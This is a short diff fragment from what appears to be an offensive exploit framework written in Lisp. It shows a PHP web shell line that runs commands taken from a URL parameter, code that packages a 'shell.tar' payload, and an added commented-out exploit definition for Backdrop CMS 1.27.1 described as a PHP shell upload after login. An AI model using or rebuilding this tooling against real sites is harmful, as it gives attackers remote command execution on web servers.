@@ -45,3 +45,12 @@ system($_GET['cmd']);
                               (project-path "shell.tar")
                               info-path
                               shell-path))))
+
+;; (define-exploit backdrop-cms (username password)
+;;   :author "Antonio Solana"
+;;   :description "PHP shell upload to CMS after login credentials"
+;;   :cpe "cpe:2.3:a:backdropcms:backdrop_cms:1.27.1:*:*:*:*:*:*:*"
+;;   :capabilities (:exec dog/prepare-payload)
+;;   :privileged nil
+;;   :check dog/check-vuln
+;;   :exploit dog/prepare-payload)
